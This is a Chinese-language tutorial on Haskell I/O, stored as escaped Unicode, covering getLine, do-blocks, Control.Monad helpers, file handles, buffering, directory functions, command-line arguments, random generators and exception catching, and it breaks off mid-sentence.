\u8f93\u5165\u6587\u672c \u00b6 \u8f93\u5165\u6587\u5b57\u9700\u8981\u5728 do \u5757\u4e2d\u4f7f\u7528 getLine\uff1a main = do line <- getLine putStrLn line getLine \u7684\u7c7b\u578b\u662f\uff1a getLine :: IO String \u800c <- \u64cd\u4f5c\u7b26\u5c06 getLine \u4e2d\u7684 String \u63d0\u53d6\u4e86\u51fa\u6765\u7ed9\u5230\u4e86 line\uff0c\u4f7f line \u53d8\u6210\u4e86 String \u7c7b\u578b\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32 \u800c\u4e14\u4f7f\u7528\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u8981\u7ecf\u8fc7\u4e00\u6b21 <-\uff0c\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 getLine \u4f5c\u4e3a\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a getLine \u4e0d\u662f String \u7c7b\u578b\uff0c\u800c\u662f IO String \u7c7b\u578b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 getChar \u6765\u83b7\u53d6\u5355\u4e2a\u5b57\u7b26\uff0c\u4f46\u4ecd\u7136\u9700\u8981\u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u6765\u63d0\u53d6 Char \u5176\u4ed6 IO \u76f8\u5173\u51fd\u6570\u7528\u6cd5 \u00b6 return \u00b6 Haskell \u4e2d\u7684 return \u548c\u5176\u4ed6\u547d\u4ee4\u5f0f\u8bed\u8a00\u4e2d\u7684 return \u5b8c\u5168\u4e0d\u540c\uff0c\u5b83\u4e0d\u4f1a\u4f7f\u51fd\u6570\u76f4\u63a5\u7ed3\u675f\u5e76\u8fd4\u56de\u4e00\u4e2a\u503c\u3002 main \u51fd\u6570\u5fc5\u987b\u5b9a\u4e49\u4e3a\u7c7b\u578b\u4e3a IO () \u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528 if \u8bed\u53e5\uff0c\u5982\u679c\u4e0d\u8f93\u51fa\u7684\u8bdd\u4e5f\u4e0d\u53ef\u4ee5\u76f4\u63a5\u653e\u4e0b\u4ec0\u4e48\u90fd\u4e0d\u5e72\uff0c\u56e0\u4e3a\u8fd9\u65f6\u5019 main \u51fd\u6570\u7684\u7c7b\u578b\u4e0d\u662f IO ()\u3002\u6240\u4ee5\u8fd9\u65f6\u9700\u8981\u4f7f\u7528 return () \u6765\u4e3a main \u51fd\u6570\u6307\u5b9a\u4e3a IO () \u7c7b\u578b\uff0c\u4f8b\u5982\uff1a main = do line <- getLine if null line then return () -- <-\u8fd9\u91cc else do ... \u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06 return \u8bed\u53e5\u4e2d\u7684\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u6bd4\u5982 a <- return 'A'\uff0c\u6267\u884c\u540e a \u5c31\u662f 'A'\u3002 when \u00b6 when \u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\uff0c\u5b83\u8868\u793a\u5728\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u6761\u4ef6\u4e0b\u4f1a\u6267\u884c\u7b2c\u4e8c\u4e2a\u51fd\u6570\uff0c\u5426\u5219\u4f1a return ()\u3002\u6bd4\u5982\uff1a import Control.Monad main = do c <- getChar when ( c /= ' ' ) $ do putChar c main \u7b49\u540c\u4e8e\uff1a main = do c <- getChar if c /= ' ' then do putChar c main else return () sequence \u00b6 sequence \u5728 IO \u4e2d\u4f7f\u7528\u65f6\u53ef\u4ee5\u8fbe\u6210 [IO a] -> IO [a] \u7684\u6548\u679c\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4f5c\uff1a [ a , b , c ] <- sequence [ getLine , getLine , getLine ] mapM & mapM_ \u00b6 \u5728 IO \u76f8\u5173\u7684\u5730\u65b9\u4f7f\u7528 map\uff0c\u53ef\u4ee5\u4f7f\u7528 mapM \u548c mapM_\uff0c\u5176\u4e2d mapM \u6709\u8fd4\u56de\u503c\u800c mapM_ \u76f4\u63a5\u6254\u6389\u4e86\u8fd4\u56de\u503c\uff1a ghci > mapM print [ 1 , 2 , 3 ] 1 2 3 [ () , () , () ] ghci > mapM_ print [ 1 , 2 , 3 ] 1 2 3 forever \u00b6 forever \u51fd\u6570\u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\u3002\u5728 main \u51fd\u6570\u5f00\u5934\u52a0\u4e0a forever \u51fd\u6570\u53ef\u4ee5\u4f7f\u540e\u9762\u7684 do \u5757\u4e00\u76f4\u91cd\u590d\u6267\u884c\u76f4\u5230\u7a0b\u5e8f\u88ab\u8feb\u7ec8\u6b62\uff0c\u5982\uff1a import Control.Monad main = forever $ do ... forM \u00b6 forM \u51fd\u6570\u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\uff0c\u5b83\u7684\u529f\u80fd\u548c mapM \u7c7b\u4f3c\uff0c\u4ece\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e2d\u9010\u4e2a\u53d6\u51fa\u5143\u7d20\u4f20\u5165\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff09\u4e2d\uff0c\u5e76\u4e14\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u8fd4\u56de IO a \u7c7b\u578b\u3002\u6bd4\u5982\uff1a import Control.Monad main = do colors <- forM [ 1 , 2 , 3 , 4 ] ( \\ a -> do putStrLn $ \"Which color do you associate with the number \" ++ show a ++ \"?\" color <- getLine return color ) putStrLn \"The colors that you associate with 1, 2, 3 and 4 are: \" mapM putStrLn colors getContents \u00b6 getLine \u83b7\u53d6\u4e00\u6574\u884c\uff0c\u800c getContents \u4ece\u6807\u51c6\u8f93\u5165\u4e2d\u83b7\u53d6\u5168\u90e8\u5185\u5bb9\u76f4\u5230\u9047\u5230 EOF\uff0c\u5e76\u4e14\u5b83\u662f lazy \u7684\uff0c\u5728\u6267\u884c\u4e86 foo <- getContents \u540e\uff0c\u5b83\u5e76\u4e0d\u4f1a\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u5e76\u4e14\u8d4b\u503c\u5230 foo\uff0c\u800c\u662f\u7b49\u5230\u9700\u8981\u4f7f\u7528 foo \u7684\u65f6\u5019\u518d\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u3002 getContents \u5728\u4f7f\u7528\u7ba1\u9053\u4f20\u5165\u6587\u5b57\u65f6\u5f88\u5e38\u7528\uff0c\u53ef\u4ee5\u4ee3\u66ff forever+getLine \u4f7f\u7528\uff0c\u6bd4\u5982\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6587\u4ef6 code.hs\uff1a import Data.Char main = do contents <- getContents putStr ( map toUpper contents ) \u4f7f\u7528 ghc --make code \u7f16\u8bd1\u540e\uff0c\u901a\u8fc7\u7ba1\u9053\u4f20\u5165\u6587\u5b57\uff1a cat text.txt | ./code \u4f1a\u5c06 text.txt \u4e2d\u7684\u6240\u6709\u5b57\u6bcd\u8f6c\u4e3a\u5927\u5199\u5e76\u8f93\u51fa interact \u00b6 \u4e0a\u8ff0\u529f\u80fd\u8fd8\u53ef\u4ee5\u8f6c\u5316\u4e3a\u4e00\u4e2a String -> String \u7684\u51fd\u6570\uff1a upperStrings = unlines . map ( map toUpper ) . lines \u800c\u5728 main \u4e2d\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u5c31\u9700\u8981\uff1a main = do contents <- getContents putStr ( upperStrings contents ) \u4f46\u662f String -> String \u7c7b\u578b\u7684\u51fd\u6570\u5728\u8f93\u5165\u8f93\u51fa\u4e2d\u7684\u4f7f\u7528\u592a\u5e38\u89c1\u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 interact \u51fd\u6570\u6765\u7b80\u5316\u3002interact \u7684\u7c7b\u578b\u662f\uff1a interact :: (String -> String) -> IO () \u53ef\u4ee5\u770b\u51fa\u5b83\u63a5\u6536\u4e00\u4e2a String -> String \u7684\u51fd\u6570\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a IO () \u7c7b\u578b\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528\u5728 main \u4e0a\u3002 \u4e8e\u662f\u6574\u4e2a\u8f6c\u6362\u4e3a\u5927\u5199\u7684\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u7b80\u5316\u4e3a\uff1a main = interact $ unlines . map ( map toUpper ) . lines \u6587\u4ef6\u548c\u6d41 \u00b6 \u4ee5\u4e0b\u4e0e\u6587\u4ef6\u548c\u6d41\u76f8\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 System.IO \u6a21\u5757\u4e2d openFile \u00b6 openFile \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a openFile :: FilePath -> IOMode -> IO Handle \u5176\u4e2d FilePath \u662f String \u7684 type synonyms\uff0c\u7528\u4e00\u4e2a\u5b57\u7b26\u4e32\u6765\u8868\u793a\u9700\u8981\u6253\u5f00\u7684\u6587\u4ef6\u7684\u8def\u5f84 IOMode \u7684\u5b9a\u4e49\u662f\uff1a data IOMode = ReadMode | WriteMode | AppendMode | ReadWriteMode \u6240\u4ee5\u5b83\u4e00\u5171\u53ea\u6709\u56db\u4e2a\u503c\uff0c\u7528\u6765\u8868\u793a\u8fdb\u884c IO \u64cd\u4f5c\u7684\u6a21\u5f0f openFile \u8fd4\u56de\u4e00\u4e2a IO Handle \u7c7b\u578b\u7684\u503c\uff0c\u5c06\u5176\u7528 <- \u64cd\u4f5c\u7b26\u63d0\u53d6\u540e\u4f1a\u51fa\u73b0\u4e00\u4e2a Handle \u7684\u503c\u3002\u4f46\u4e0d\u80fd\u4ece Handle \u4e2d\u76f4\u63a5\u4f7f\u7528\u6587\u5b57\uff0c\u8fd8\u9700\u8981\u4f7f\u7528\u4e00\u7cfb\u5217\u51fd\u6570\uff1a hGetContents :: Handle -> IO String \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff0c\u8fd4\u56de\u4e00\u4e2a IO String hGetChar :: Handle -> IO Char \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26 hGetLine :: Handle -> IO String \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u4e00\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a IO String hPutStr :: Handle -> String -> IO () \uff0c\u5411 Handle \u4e2d\u8f93\u51fa\u5b57\u7b26\u4e32 hPutStrLn :: Handle -> String -> IO () \uff0c\u540c\u4e0a \u5728\u4f7f\u7528 openFile \u8fdb\u884c\u6587\u4ef6\u64cd\u4f5c\u540e\uff0c\u9700\u8981\u4f7f\u7528 hClose \u624b\u52a8\u5173\u95ed Handle\u3002hClose :: Handle -> IO ()\uff0c\u63a5\u6536\u4e00\u4e2a Handle \u5e76\u8fd4\u56de IO ()\uff0c\u53ef\u4ee5\u76f4\u63a5\u653e\u5728 main \u51fd\u6570\u672b\u5c3e \u6240\u4ee5\u4f7f\u7528 openFile \u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u5168\u90e8\u5185\u5bb9\u5e76\u8f93\u51fa\u7684\u5168\u90e8\u4ee3\u7801\u662f\uff1a import System.IO main = do handle <- openFile \"text.txt\" ReadMode contents <- hGetContents handle putStrLn contents hClose handle withFile \u00b6 withFile \u7c7b\u4f3c Python \u4e2d\u7684 with open\uff0c\u5b83\u5728\u8bfb\u53d6\u6587\u4ef6\u4f7f\u7528\u4e4b\u540e\u4e0d\u9700\u8981\u624b\u52a8 close \u6587\u4ef6\u3002\u5b83\u7684\u7c7b\u578b\u662f\uff1a withFile :: FilePath -> IOMode -> (Handle -> IO a) -> IO a \u53ef\u4ee5\u770b\u51fa\uff0c\u5b83\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff1a FilePath \uff1a\u4e00\u4e2a\u8868\u793a\u6587\u4ef6\u8def\u5f84\u7684String IOMode \uff1a\u6253\u5f00\u6587\u4ef6\u7684\u6a21\u5f0f (Handle -> IO a) \uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u8868\u793a\u5bf9\u8bfb\u53d6\u6587\u4ef6\u540e\u7684Handle\u7d22\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u8fd4\u56de\u4e00\u4e2aI/O action\uff1b\u800c\u8fd9\u4e2a\u8fd4\u56de\u503c\u4e5f\u5c06\u4f5c\u4e3awithFile\u7684\u8fd4\u56de\u503c \u73b0\u5728\u4f7f\u7528 withFile \u6765\u6539\u5199\u4e0a\u8ff0\u4ee3\u7801\uff1a import System.IO main = withFile \"text.txt\" ReadMode ( \\ handle -> do contents <- hGetContents handle putStrLn contents ) withFile \u7684\u529f\u80fd\u76f8\u5f53\u4e8e\u4ee5\u4e0b\u51fd\u6570\uff1a withFile' :: FilePath -> IOMode -> ( Handle -> IO a ) -> IO a withFile' path mode f = do handle <- openFile path mode result <- f handle hClose handle return result readFile \u00b6 readFile \u53ef\u4ee5\u66f4\u52a0\u7b80\u5316\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u7684\u64cd\u4f5c\uff0c\u5b83\u7684\u7c7b\u578b\uff1a readFile :: FilePath -> IO String \u5b83\u53ea\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u8868\u793a\u6587\u4ef6\u8def\u5f84\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u5176\u4e2d\u4ee5\u5176\u4e2d\u5185\u5bb9\u4e3a\u5185\u5bb9\u7684 I/O action\uff1a import System.IO main = do contents <- readFile \"text.txt\" putStrLn contents writeFile \u00b6 writeFile \u7b80\u5316\u4e86\u5199\u5165\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u5b83\u7684\u7c7b\u578b\uff1a writeFile :: FilePath -> String -> IO () \u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2aIO () appendFile \u00b6 appendFile \u7c7b\u4f3c writeFile\uff0c\u4f46\u4f7f\u7528\u5b83\u4e0d\u4f1a\u8986\u76d6\u6587\u4ef6\u4e2d\u539f\u6765\u5185\u5bb9\uff0c\u800c\u662f\u76f4\u63a5\u628a\u5b57\u7b26\u4e32\u6dfb\u52a0\u5230\u6587\u4ef6\u672b\u5c3e buffer \u00b6 \u6587\u4ef6\u4ee5\u6d41\u7684\u5f62\u5f0f\u88ab\u8bfb\u53d6\uff0c\u9ed8\u8ba4\u6587\u5b57\u6587\u4ef6\u7684\u7f13\u51b2\u533a\uff08buffer\uff09\u5927\u5c0f\u662f\u4e00\u884c\uff0c\u5373\u6bcf\u6b21\u8bfb\u53d6\u4e00\u884c\u5185\u5bb9\uff1b\u9ed8\u8ba4\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4ee5\u5757\u4e3a\u5355\u4f4d\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u5219\u6839\u636e\u7cfb\u7edf\u9ed8\u8ba4\u6765\u9009\u62e9\u3002 \u4e5f\u53ef\u4ee5\u901a\u8fc7 hSetBuffering \u51fd\u6570\u6765\u624b\u52a8\u8bbe\u7f6e\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff1a hSetBuffering :: Handle -> BufferMode -> IO () \u5b83\u63a5\u6536\u4e00\u4e2a handle\uff0c\u548c\u4e00\u4e2a BufferMode\uff0c\u5e76\u8fd4\u56de IO ()\u3002\u5176\u4e2d BufferMode \u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a NoBuffering \uff1a\u6ca1\u6709\u7f13\u51b2\u533a\uff0c\u4e00\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26 LineBuffering \uff1a\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4e00\u884c\uff0c\u5373\u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\u5185\u5bb9 BlockBuffering (Maybe Int) \uff1a\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4e00\u5757\uff0c\u5757\u7684\u5927\u5c0f\u7531 Maybe Int \u6307\u5b9a\uff1a BlockBuffering (Nothing) \uff1a\u4f7f\u7528\u7cfb\u7edf\u9ed8\u8ba4\u7684\u5757\u5927\u5c0f BlockBuffering (Just 2048) \uff1a\u4e00\u5757\u7684\u5927\u5c0f\u662f 2048 \u5b57\u8282\uff0c\u5373\u6bcf\u6b21\u8bfb\u5165 2048 bytes \u7684\u5185\u5bb9 \u7f13\u51b2\u533a\u7684\u5237\u65b0\u662f\u81ea\u52a8\u7684\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 hFlush \u6765\u624b\u52a8\u5237\u65b0 hFlush :: Handle -> IO () \u4f20\u5165\u4e00\u4e2a handle\uff0c\u8fd4\u56de IO ()\uff0c\u5373\u5237\u65b0\u5bf9\u5e94 handle \u7684\u7f13\u51b2\u533a openTempFile \u00b6 openTempFile \u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\uff1a openTempFile :: FilePath -> String -> IO (FilePath, Handle) FilePath \u6307\u4e34\u65f6\u6587\u4ef6\u8981\u521b\u5efa\u7684\u4f4d\u7f6e\u8def\u5f84\uff0c String \u6307\u4e34\u65f6\u6587\u4ef6\u540d\u5b57\u7684\u524d\u7f00\uff0c\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5176\u5185\u5bb9\u7b2c\u4e00\u4e2a FilePath \u662f\u521b\u5efa\u5f97\u5230\u7684\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84\uff0c Handle \u662f\u4e34\u65f6\u6587\u4ef6\u7684 handle \u4f8b\u5982\uff1a import System.IO main = do ( tempFile , tempHandle ) <- openTempFile \".\" \"temp\" ... hClose tempHandle \".\" \u6307\u4e34\u65f6\u6587\u4ef6\u8981\u5728\u5f53\u524d\u76ee\u5f55\u521b\u5efa\uff0c \"temp\" \u6307\u4e34\u65f6\u6587\u4ef6\u540d\u5b57\u4ee5 temp \u5f00\u5934\u3002\u6700\u7ec8\u5f97\u5230\u7684 tempFile \u5c31\u662f ./temp.......\uff0ctemp \u540e\u4e3a\u968f\u673a\u6570\u5b57\uff0c\u5982 ./temp43620-0 \u8def\u5f84\u64cd\u4f5c \u00b6 \u76f8\u5173\u51fd\u6570\u90fd\u5305\u542b\u5728 System.Directory \u6a21\u5757\u4e2d\uff0c\u5168\u90e8\u5185\u5bb9\u89c1 System.Directory getCurrentDirectory \u00b6 getCurrentDirectory :: IO FilePath \u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5176\u5185\u5bb9\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u8868\u793a\u5f53\u524d\u8def\u5f84\u7684\u7edd\u5bf9\u8def\u5f84 removeFile \u00b6 removeFile :: FilePath -> IO () \u8f93\u5165\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\uff0c\u5e76\u5220\u9664\u6389\u5b83 renameFile \u00b6 renameFile :: FilePath -> FilePath -> IO () \u8f93\u5165\u4e00\u4e2a\u539f\u8def\u5f84\uff0c\u4e00\u4e2a\u65b0\u8def\u5f84\uff0c\u4e3a\u539f\u8def\u5f84\u7684\u6587\u4ef6\u91cd\u547d\u540d\u4e3a\u65b0\u8def\u5f84\u7684\u540d doesFileExist \u00b6 doesFileExist :: FilePath -> IO Bool \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5e03\u5c14\u503c\u7684 I/O action Command line arguments \u00b6 System.Environment \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u5904\u7406\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570 getArgs \u00b6 getArgs :: IO [String] \u4e0d\u9700\u8981\u8f93\u5165\u53c2\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5185\u5bb9\u4e3a\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570\uff08\u4e00\u4e2a\u7531String\u7ec4\u6210\u7684\u5217\u8868\uff09\u3002\u76f8\u5f53\u4e8e C \u8bed\u8a00\u4e2d\u7684 argv[1:] getProgName \u00b6 getProgName :: IO String \u8fd4\u56de I/O action\uff0c\u5185\u5bb9\u4e3a\u7a0b\u5e8f\u7684\u540d\u5b57\uff0c\u76f8\u5f53\u4e8e C \u8bed\u8a00\u4e2d\u7684 argv[0] Randomness \u00b6 \u548c\u968f\u673a\u6570\u6709\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 System.Random \u6a21\u5757\u4e2d\u3002GHCi \u542f\u52a8\u65f6\u53ef\u80fd\u4e0d\u4f1a\u5305\u542b System.Random \u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u65e0\u6cd5\u627e\u5230\u6a21\u5757\u3002\u9700\u8981\u901a\u8fc7 stack \u6253\u5f00: stack ghci --package random Haskell \u8981\u6c42\u540c\u6837\u7684\u7a0b\u5e8f\u9700\u8981\u8fd0\u884c\u51fa\u540c\u6837\u7684\u7ed3\u679c\uff0c\u9664\u4e86\u7528\u5230\u4e86 I/O action\uff0c\u6240\u6709\u4f1a\u9020\u6210\u4e0d\u540c\u7ed3\u679c\u7684\u51fd\u6570\u90fd\u8981\u4ea4\u7ed9 I/O action \u6765\u5b8c\u6210 \u90a3\u8981\u4f7f\u968f\u673a\u6570\u8131\u79bb IO \u5b58\u5728\uff0c\u5c31\u8981\u7528\u5230\u968f\u673a\u751f\u6210\u5668\uff08random generator\uff09 System.Random \u6a21\u5757\u63d0\u4f9b\u4e86\u51e0\u4e2a\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\uff1a random \u00b6 random :: (Random a, RandomGen g) => g -> (a, g) \u5176\u4e2d\u53c8\u6709\u4e24\u4e2a\u65b0\u7684 typeclass\uff0cRandom \u8868\u793a\u53ef\u4ee5\u53d6\u968f\u673a\uff0cRandomGen \u8868\u793a\u968f\u673a\u6570\u751f\u6210\u5668\u3002random \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u751f\u6210\u7684\u968f\u673a\u6570\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f\u4e00\u4e2a\u65b0\u7684\u968f\u673a\u6570\u751f\u6210\u5668 \u83b7\u53d6\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u4ee5\u4f7f\u7528 mkStdGen \u51fd\u6570\uff1a mkStdGen :: Int -> StdGen \u5176\u4e2d StdGen \u662f\u4e00\u4e2a RandomGen \u7684\u5b9e\u4f8b \u8fd0\u7528 random \u751f\u6210\u968f\u673a\u6570\u9700\u8981\u6307\u5b9a\u7c7b\u578b\uff0c\u4e0d\u7136\u7a0b\u5e8f\u65e0\u6cd5\u786e\u5b9a a \u662f\u4ec0\u4e48\u7c7b\u578b\u3002\u4f8b\u5982\uff1a ghci > random ( mkStdGen 100 ) :: ( Int , StdGen ) ( 9216477508314497915 , StdGen { unStdGen = SMGen 712633246999323047 2532601429470541125 }) ghci > random ( mkStdGen 100 ) :: ( Char , StdGen ) ( '\\ 537310 ' ,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125}) ghci > random ( mkStdGen 100 ) :: ( Bool , StdGen ) ( True , StdGen { unStdGen = SMGen 712633246999323047 2532601429470541125 }) \u518d\u6b21\u8fd0\u884c\u540c\u6837\u7684\u51fd\u6570\uff0c\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002\u6240\u4ee5\u5982\u679c\u9700\u8981\u751f\u6210\u5176\u4ed6\u7684\u968f\u673a\u6570\uff0c\u9700\u8981\u66f4\u6362\u751f\u6210\u5668\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e00\u6b21\u8c03\u7528\u7ed3\u679c\u8fd4\u56de\u7684\u65b0\u968f\u673a\u6570\u751f\u6210\u5668\uff1a threeCoins :: StdGen -> ( Bool , Bool , Bool ) threeCoins gen = let ( firstCoin , newGen ) = random gen ( secondCoin , newGen' ) = random newGen ( thirdCoin , newGen'' ) = random newGen' in ( firstCoin , secondCoin , thirdCoin ) randoms \u00b6 randoms :: (Random a, RandomGen g) => g -> [a] randoms \u63a5\u6536\u4e00\u4e2a RandomGen\uff0c\u8fd4\u56de\u4e00\u4e2a\u968f\u673a\u7684\u65e0\u7a77\u5217\u8868\u3002\u56e0\u4e3a\u5b83\u662f\u65e0\u7a77\u7684\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd4\u56de\u65b0\u7684\u968f\u673a\u6570\u751f\u6210\u5668 randomR \u00b6 randomR :: (Random a, RandomGen g) => (a, a) -> g -> (a, g) \u53ef\u4ee5\u7528\u6765\u751f\u6210\u6709\u8303\u56f4\u7684\u968f\u673a\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5143\u7ec4\uff0c\u8868\u793a\u751f\u6210\u968f\u673a\u6570\u7684\u8303\u56f4(\u95ed\u533a\u95f4) randomRs \u00b6 randomRs :: (Random a, RandomGen g) => (a, a) -> g -> [a] \u540c\u4e0a\u4e24\u4e2a\uff0c\u751f\u6210\u6709\u8303\u56f4\u7684\u65e0\u7a77\u968f\u673a\u6570\u5217\u8868 getStdGen \u00b6 \u5982\u679c\u60f3\u8981\u8ba9\u7a0b\u5e8f\u6bcf\u6b21\u8fd0\u884c\u5f97\u5230\u4e0d\u540c\u7684\u968f\u673a\u7ed3\u679c\uff0c\u9700\u8981\u4f7f\u7528 getStdGen \u6765\u83b7\u53d6\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u5b83\u4f1a\u5728\u6bcf\u6b21\u8fd0\u884c\u7684\u65f6\u5019\u4ea7\u751f\u4e0d\u540c\u7684\u503c\uff0c\u4e5f\u56e0\u6b64\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u4e00\u4e2a I/O action\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u76f4\u63a5\u7684 StdGen getStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen \u5373\u53ef\u4ee5\u770b\u6210 getStdGen :: IO StdGen\uff0c\u9700\u8981\u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u5c06 StdGen \u63d0\u53d6\u51fa\u6765 \u4f46\u662f\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\uff0cgetStdGen \u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684\uff0c\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\u4e0d\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u53e6\u4e00\u4e2a\u51fd\u6570 newStdGen newStdGen \u00b6 newStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen \u6267\u884c newStdGen \u4f1a\u8fdb\u884c\u4e24\u4e2a\u64cd\u4f5c\uff1a \u66f4\u65b0\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u4e0b\u6b21\u6267\u884c getStdGen \u4f1a\u83b7\u5f97\u4e0d\u540c\u7684\u7ed3\u679c \u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5305\u542b\u4e00\u4e2a\u65b0\u7684 StdGen\uff08\u4f46\u662f\u8fd9\u4e2a\u751f\u6210\u5668\u548c\u5168\u5c40\u751f\u6210\u5668\u4e5f\u4e0d\u540c\uff09 Exceptions \u00b6 \u7a0b\u5e8f\u5728\u8fd0\u884c\u5931\u8d25\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u53ef\u4ee5\u901a\u8fc7 Control.Exception \u6a21\u5757\u4e2d\u7684 catch \u51fd\u6570\u6765\u6355\u83b7\u5f02\u5e38\uff1a catch :: Exception e => IO a -> (e -> IO a) -> IO a \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u4ee5 IO a \u4e3a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u63a5\u6536\u5f02\u5e38\u5e76\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a import Control.Exception main = main' ` catch ` handler main' :: IO () main' = do ... handler :: Exception e => e -> IO () handler e = putStrLn \"...\" \u4e5f\u53ef\u4ee5\u5229\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\u548c System.IO.Error \u4e2d\u7684\u51fd\u6570\u6765\u5224\u65ad IO 